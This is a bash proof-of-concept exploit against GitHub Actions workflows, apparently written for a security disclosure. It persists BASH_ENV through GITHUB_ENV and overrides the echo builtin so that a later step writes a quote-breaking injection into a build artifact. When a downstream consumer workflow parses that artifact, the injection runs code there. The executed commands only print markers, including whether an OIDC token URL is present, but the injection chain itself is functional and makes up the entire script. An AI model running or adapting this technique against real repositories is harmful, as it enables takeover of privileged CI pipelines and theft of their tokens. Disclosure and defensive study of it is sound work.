#!/usr/bin/env bash
set -euo pipefail

cat > "$PWD/msrc-poison-save-step.sh" <<'POISON'
echo() {
  builtin echo "1'; echo \"BASH_ENV=$PWD/msrc-consumer-bashenv.sh\" >> \"\$GITHUB_ENV\"; printf '%s\n' 'echo MSRC_CONSUMER_RCE_MARKER=true' 'echo MSRC_CONSUMER_AFTER_ARTIFACT_PARSE=true' 'echo MSRC_CONSUMER_WORKFLOW=\$GITHUB_WORKFLOW' 'echo MSRC_CONSUMER_EVENT=\$GITHUB_EVENT_NAME' 'echo MSRC_CONSUMER_OIDC_URL_PRESENT=\${ACTIONS_ID_TOKEN_REQUEST_URL:+true}' > \"$PWD/msrc-consumer-bashenv.sh\"; echo '"
}
POISON

# Persist BASH_ENV into the next producer shell step. The following official
# `echo $PR_NUM > pr_num.txt` step will source this file and write attacker
# controlled content into the artifact, despite PR_NUM being fixed by workflow
# expression to github.event.number.
echo "BASH_ENV=$PWD/msrc-poison-save-step.sh" >> "$GITHUB_ENV"

echo "MSRC_PRODUCER_PAYLOAD_RAN=true"
echo "MSRC_PRODUCER_WROTE_BASH_ENV_FOR_NEXT_STEP=true"
